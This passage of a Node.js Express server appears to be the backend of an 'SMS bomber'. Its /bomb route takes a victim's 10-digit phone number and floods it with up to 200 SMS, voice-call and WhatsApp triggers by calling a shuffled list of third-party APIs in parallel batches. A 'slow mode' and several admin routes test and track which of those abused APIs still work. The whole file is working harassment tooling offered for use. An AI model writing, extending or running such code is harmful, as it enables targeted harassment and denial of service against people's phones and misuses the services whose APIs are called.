    if (slowModeLock) {
        logInfo('Slow mode already running. Waiting for completion...');
        return await slowModeLock;
    }

    if (slowModeCompleted) {
        logSuccess('Slow mode already completed. Loading from DB...');
        return await loadWorkingApis();
    }

    slowModeLock = (async () => {
        try {
            logInfo(`FIRST RUN SLOW MODE: Testing all APIs (phone: ${phoneToTest})...`);
            const workingApis = [];
            const startTime = Date.now();

            for (let i = 0; i < uniqueApis.length; i++) {
                const api = uniqueApis[i];

                // 🔥 10 min timer check
                if (Date.now() - startTime > AUTO_SLOW_MODE_MAX_DURATION_MS) {
                    logWarn(`10 min timer reached! Stopping at API ${i + 1}/${uniqueApis.length}`);
                    break;
                }

                let success = false;
                let totalResponseTime = 0;
                let successCount = 0;
                let failCount = 0;

                for (let attempt = 0; attempt <= FIRST_RUN_RETRY; attempt++) {
                    const result = await makeApiCall(api, phoneToTest, FIRST_RUN_TIMEOUT);
                    totalResponseTime += result.responseTime;

                    if (result.success) {
                        success = true;
                        successCount++;
                        break;
                    } else {
                        failCount++;
                    }

                    if (attempt < FIRST_RUN_RETRY) {
                        await new Promise(r => setTimeout(r, FIRST_RUN_RETRY_DELAY));
                    }
                }

                const avgTime = Math.round(totalResponseTime / Math.max(1, (successCount + failCount)));
                const timeout = Math.max(2000, Math.min(avgTime * 2, 8000));

                try {
                    await ApiHealth.findOneAndUpdate(
                        { api_name: api.name },
                        {
                            api_name: api.name,
                            api_url: typeof api.url === 'string' ? api.url : api.name,
                            method: (api.method || 'POST').toUpperCase(),
                            working: success,
                            tested: true,
                            avg_response_time: avgTime,
                            success_count: successCount,
                            fail_count: failCount,
                            timeout_ms: timeout,
                            last_tested: new Date()
                        },
                        { upsert: true, new: true }
                    );
                } catch (dbErr) {
                    logError(`DB save error for ${api.name}: ${dbErr.message}`);
                }

                if (success) {
                    workingApis.push({ api, timeout });
                    logSuccess(`[${i + 1}/${uniqueApis.length}] ${api.name} - WORKING (${avgTime}ms)`, { api: api.name, time: avgTime });
                } else {
                    logFail(`[${i + 1}/${uniqueApis.length}] ${api.name} - FAILED`, { api: api.name });
                }

                await new Promise(r => setTimeout(r, FIRST_RUN_DELAY));
            }

            firstRunMode = false;
            slowModeCompleted = true;
            const totalTime = Math.round((Date.now() - startTime) / 1000);
            logSuccess(`First run complete in ${totalTime}s. ${workingApis.length}/${uniqueApis.length} APIs working.`);

            return workingApis;
        } finally {
            slowModeLock = null;
        }
    })();

    return await slowModeLock;
}

// ============================================================
// ===== AUTO SLOW MODE =====
// ============================================================

async function triggerAutoSlowMode() {
    if (autoSlowModeRunning) return;
    autoSlowModeRunning = true;

    logInfo('AUTO SLOW MODE STARTING (server startup test)...');
    logInfo(`Test phone: ${AUTO_SLOW_MODE_PHONE}`);
    logInfo(`Max duration: ${AUTO_SLOW_MODE_MAX_DURATION_MS / 1000 / 60} minutes`);

    try {
        await firstRunSlowMode(AUTO_SLOW_MODE_PHONE);
        logSuccess('AUTO SLOW MODE COMPLETED');
    } catch (err) {
        logError('AUTO SLOW MODE ERROR: ' + err.message);
    } finally {
        autoSlowModeRunning = false;
    }
}

// ============================================================
// ===== LOAD WORKING APIS FROM DB =====
// ============================================================

async function loadWorkingApis() {
    const docs = await ApiHealth.find({ working: true }).lean();
    const result = [];

    for (const doc of docs) {
        const api = uniqueApis.find(a => a.name === doc.api_name);
        if (api) {
            result.push({ api, timeout: doc.timeout_ms || 5000 });
        }
    }

    return result;
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        total_apis: uniqueApis.length,
        first_run_mode: firstRunMode,
        slow_mode_running: !!slowModeLock,
        slow_mode_completed: slowModeCompleted,
        auto_slow_mode_running: autoSlowModeRunning,
        db_connected: dbConnected,
        uptime: process.uptime()
    });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;

    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
    }

    const effectiveDuration = Math.min(Number(duration) || 1, MAX_EFFECTIVE_DURATION);

    logInfo(`Bombing ${phone} | Requested: ${duration}min | Effective: ${effectiveDuration}min | FirstRun: ${firstRunMode} | SlowLock: ${!!slowModeLock}`);

    try {
        const startTime = Date.now();
        let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
        const apiCallLogs = [];

        let workingApis = [];

        if (firstRunMode || !slowModeCompleted) {
            logInfo('Waiting for slow mode to complete...');
            workingApis = await firstRunSlowMode(phone);
        } else {
            workingApis = await loadWorkingApis();

            if (workingApis.length === 0) {
                logWarn('No working APIs in DB. Activating slow mode...');
                workingApis = await firstRunSlowMode(phone);
            }
        }

        if (workingApis.length === 0) {
            return res.json({
                success: false,
                phone,
                totalSent: 0,
                sms: 0,
                calls: 0,
                whatsapp: 0,
                error: 'No working APIs available'
            });
        }

        let maxRequests = 100;
        if (effectiveDuration <= 1) maxRequests = 200;
        else if (effectiveDuration <= 5) maxRequests = 150;
        else if (effectiveDuration <= 10) maxRequests = 100;
        else maxRequests = 80;

        const shuffled = [...workingApis];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }

        const BATCH_SIZE = 15;
        const BATCH_DELAY = 10;
        let sent = 0;

        for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
            const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));

            const results = await Promise.allSettled(
                batch.map(item => makeApiCall(item.api, phone, item.timeout))
            );

            for (let k = 0; k < results.length; k++) {
                const result = results[k];
                const item = batch[k];

                // 🔥 HAR API CALL LOG
                if (result.status === 'fulfilled' && result.value) {
                    const val = result.value;
                    const apiName = item.api.name;
                    if (val.success) {
                        logSuccess(`API ${apiName} → ${val.status || 'OK'} (${val.responseTime}ms)`);
                        success++;
                        sent++;
                        const lowerName = apiName.toLowerCase();
                        if (lowerName.includes('call') || lowerName.includes('voice')) callCount++;
                        else if (lowerName.includes('whatsapp')) whatsappCount++;
                        else smsCount++;
                    } else {
                        logFail(`API ${apiName} → FAIL (${val.responseTime}ms)${val.hardTimeout ? ' [HARD TIMEOUT]' : ''}`);
                    }
                } else {
                    logFail(`API ${item.api.name} → REJECTED`);
                }
            }

            if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
                await new Promise(r => setTimeout(r, BATCH_DELAY));
            }
        }

        const elapsed = (Date.now() - startTime) / 1000;

        logSuccess(`Bombing ${phone} done | Sent: ${success} | SMS: ${smsCount} | Calls: ${callCount} | WA: ${whatsappCount} | ${elapsed.toFixed(1)}s`);

        res.json({
            success: true,
            phone,
            totalSent: success,
            sms: smsCount,
            calls: callCount,
            whatsapp: whatsappCount,
            elapsed: elapsed.toFixed(1) + 's',
            apis_used: workingApis.length
        });

    } catch (error) {
        logError('Bombing error: ' + error.message);
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// ===== ADMIN ROUTES =====
// ============================================================

app.get('/health-apis', async (req, res) => {
    try {
        const apis = await ApiHealth.find({}).sort({ working: -1, avg_response_time: 1 }).lean();
        const total = apis.length;
        const working = apis.filter(a => a.working).length;
        const failed = total - working;

        res.json({
            summary: {
                total_apis: uniqueApis.length,
                tested: total,
                working,
                failed,
                first_run_mode: firstRunMode,
                slow_mode_running: !!slowModeLock,
                slow_mode_completed: slowModeCompleted,
                auto_slow_mode_running: autoSlowModeRunning
            },
            apis: apis.map(a => ({
                name: a.api_name,
                working: a.working,
                avg_response_time_ms: a.avg_response_time,
                timeout_ms: a.timeout_ms,
                success: a.success_count,
                fail: a.fail_count,
                last_tested: a.last_tested
            }))
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/logs', (req, res) => {
    const limit = parseInt(req.query.limit) || 100;
    const logs = logStore.getAll();
    const recent = logs.slice(-limit);
    res.json({
        total_logs: logs.length,
        retention: '2 minutes',
        logs: recent
    });
});

app.post('/reset-health', async (req, res) => {
    try {
        await ApiHealth.deleteMany({});
        firstRunMode = true;
        slowModeCompleted = false;
        slowModeLock = null;
        logWarn('Health data reset. First-run mode activated.');
        res.json({ success: true, message: 'Health data reset. Next /bomb will trigger slow mode.' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/trigger-slow-mode', async (req, res) => {
    if (slowModeLock || autoSlowModeRunning) {
        return res.json({ success: false, message: 'Slow mode already running' });
    }
    triggerAutoSlowMode();
    res.json({ success: true, message: 'Slow mode triggered manually' });
});

app.get('/health-stats', async (req, res) => {
    try {
        const total = uniqueApis.length;
        const tested = await ApiHealth.countDocuments({ tested: true });
        const working = await ApiHealth.countDocuments({ working: true });
        const fastest = await ApiHealth.findOne({ working: true }).sort({ avg_response_time: 1 }).lean();
        const slowest = await ApiHealth.findOne({ working: true }).sort({ avg_response_time: -1 }).lean();

        res.json({
            total_apis: total,
            tested,
            working,
            failed: tested - working,
            untested: total - tested,
            first_run_mode: firstRunMode,
            slow_mode_running: !!slowModeLock,
            slow_mode_completed: slowModeCompleted,
            auto_slow_mode_running: autoSlowModeRunning,
            fastest_api: fastest ? { name: fastest.api_name, avg_ms: fastest.avg_response_time } : null,
            slowest_api: slowest ? { name: slowest.api_name, avg_ms: slowest.avg_response_time } : null
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ============================================================
// ===== START SERVER =====
// ============================================================

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    logSuccess(`API Server running on port ${PORT}`);
    logInfo(`Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    logInfo(`APIs loaded: ${uniqueApis.length}`);
    logInfo(`Max effective duration: ${MAX_EFFECTIVE_DURATION} min`);
    logInfo(`First-run slow mode: Enabled (LOCKED)`);
    logInfo(`MongoDB health tracking: Enabled`);
    logInfo(`Auto slow mode: ${AUTO_SLOW_MODE ? 'ENABLED' : 'DISABLED'}`);
    logInfo(`Log retention: 2 minutes (auto-cleanup)`);

    // 🔥 Start log auto-cleanup
    logStore.startCleanup();
});
